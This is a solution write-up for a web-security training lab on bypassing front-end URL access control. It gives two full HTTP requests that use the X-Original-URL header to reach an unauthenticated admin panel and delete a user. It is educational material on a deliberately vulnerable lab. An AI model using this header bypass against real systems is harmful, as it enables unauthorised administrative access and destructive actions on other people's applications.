# [Lab 5: URL-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented)

---

## Description

This website has an unauthenticated admin panel at `/admin`, but a front-end system has been configured to block external access to that path. However, the back-end application is built on a framework that supports the `X-Original-URL` header.

To solve the lab, access the admin panel and delete the user `carlos`.

---

## Solution

The `X-Original-URL` header specifies the actual URL path being requested. If an application is sensitive to this header, it will ignore the actual URL path being requested and use this header value instead.

The application restricts access to the `/admin` URL. However, by using the `X-Original-URL: /admin` header, it is possible to bypass this restriction and access the admin panel unauthenticated.

```http
GET / HTTP/1.1
Host: ace81f771e75622280e1c59c00660090.web-security-academy.net
Cookie: session=ajoWMof55qCVTp4YPDhjfPDmIswKS2Cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ace81f771e75622280e1c59c00660090.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
X-Original-URL: /admin
```

![](images/Pasted%20image%2020210922195629.png)

To delete `carlos`, the browser generates a `GET` request to the `/admin/delete?username=carlos` path. Use the `X-Original-URL` header to navigate to this path as well.

```http
GET /?username=carlos HTTP/1.1
Host: ace81f771e75622280e1c59c00660090.web-security-academy.net
Cookie: session=ajoWMof55qCVTp4YPDhjfPDmIswKS2Cc
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ace81f771e75622280e1c59c00660090.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
X-Original-URL: /admin/delete
```

Note that the `username=carlos` URL parameter remains in the original path and not in the `X-Original-URL` header value. Submitting this request deletes `carlos` and completes the challenge.
